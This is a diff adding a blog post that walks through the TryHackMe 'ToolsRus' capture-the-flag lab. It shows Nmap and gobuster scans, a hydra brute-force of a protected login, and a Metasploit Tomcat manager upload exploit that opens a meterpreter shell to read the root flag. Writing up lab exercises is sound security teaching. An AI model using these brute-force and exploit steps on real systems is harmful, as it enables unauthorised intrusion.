@@ -1,0 +1,102 @@
+---
+layout: post
+title:  "Tryhackme: ToolsRus"
+date:   2021-01-15 18:00:56 +0200
+categories: tryhackme
+---
+
+## Nmap Scan ##
+
+As always, we begin with our usual Nmap scan.
+```
+Nmap scan report for 10.10.45.103
+Host is up, received echo-reply ttl 63 (0.056s latency).
+Scanned at 2021-01-20 15:09:49 EST for 577s
+Not shown: 65531 closed ports
+Reason: 65531 resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 51:45:94:c5:51:42:ff:bd:ab:44:2f:47:4d:22:46:ca (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiI3uH3w9a+RiEfu7Gp5et4/aZyPR4pfmcXgxCwQe1UC1ZzgQ8EmaK77jXBOhL6NE8NNp27l0/d/Q+aayMjvchnGbk0uykCowUEW5rSly0ARep/5PYrdJ2jKp1SEIBR+C6cgKwOay1+w9p1bB71I55wMKo12nsCwkLnwR8UZh2vwEdxf59FTBE4zW/ppJ7NYzB5JHqzp4rIuYo8ZqRBWfWBtwqub/LNCEeIsWxpNmSo/Y2VQo467GhGuFy5RShmhO4W4gGKIVbRt0Avj3PSwdCzxuHJXVtTJEdMeqMZ9UUzZzVLUm+dsUefYWS8uTtvVjv3lktVG3TbEG0ruvixixf
+|   256 28:7a:3e:e6:15:a4:c5:6f:ee:20:bd:46:59:a1:28:f0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGehpOlDDm6qSFzfGtiEYc7h6TCjMcmX/00JCAouQ0k4NCpbY3b48R/LP+AitEkqqbvIBCDVo+1K+LSOcW2NabQ=
+|   256 c3:d1:64:bf:04:e9:b9:e7:d9:9d:f5:21:e9:12:af:7e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFDtToBeKyEOftjc0w1SuFxjPBITy4/0N+tmDX80mEJt
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    syn-ack ttl 63 Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+Device type: general purpose|WAP|phone
+Running (JUST GUESSING): Linux 3.X|5.X|4.X (95%), Asus embedded (94%), Google Android 5.X|6.X|7.X (92%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:google:android:5.1 cpe:/o:google:android:6 cpe:/o:google:android:7 cpe:/o:linux:linux_kernel:4
+OS fingerprint not ideal because: Timing level 5 (Insane) used
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Android 5.1 (92%), Android 6.0 - 7.1.2 (Linux 3.18 - 4.4.1) (92%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 (92%)
+No exact OS matches for host (test conditions non-ideal).
+```
+
+## Bruteforcing Directories ##
+
+Running ```gobuster dir -u http://10.10.45.103 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16``` will show us some interesting directories, among which is the one we are prompted to find.
+```
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.45.103
+[+] Threads:        16
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/01/15 15:04:16 Starting gobuster
+===============================================================
+/guidelines (Status: 301)
+/protected (Status: 401)
+/server-status (Status: 403)
+===============================================================
+2021/01/15 15:21:00 Finished
+===============================================================
+
+```
+
+## Password Bruteforcing ##
+
+Entering the directory in our browser's URL box we can find a potential username, we can bruteforce.
+Checking out the ```protected``` directory we stumble upon a login prompt. Let's try and bruteforce it.
+``` hydra -l USER -P /usr/share/wordlists/rockyou.txt.gz 10.10.45.103 -t 16 http-get /protected/```
+
+This way we will get the insecure credential this found user has.
+
+## Exploiting outdated Tomcat ##
+
+As we login using the found credentials, we are prompted to look for another web service. Thus we can try the service indicated to us by our previous nmap scan, the one running on port 1234.
+
+Doing a simple ```searchsploit``` we find out this service is vulnerable and we are also suggested a good exploit.
+
+Entering Metasploit, we try to see if this exploit can help in our case.
+
+```
+msf6 > use multi/http/tomcat_mgr_upload
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.45.103
+msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword PASSWORD
+msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername USER
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
+msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost tun0
+msf6 exploit(multi/http/tomcat_mgr_upload) > run
+```
+
+Success! We popped a meterpreter shell. Let's get our shell!
+
+```
+meterpreter > cat /root/flag.txt
+```
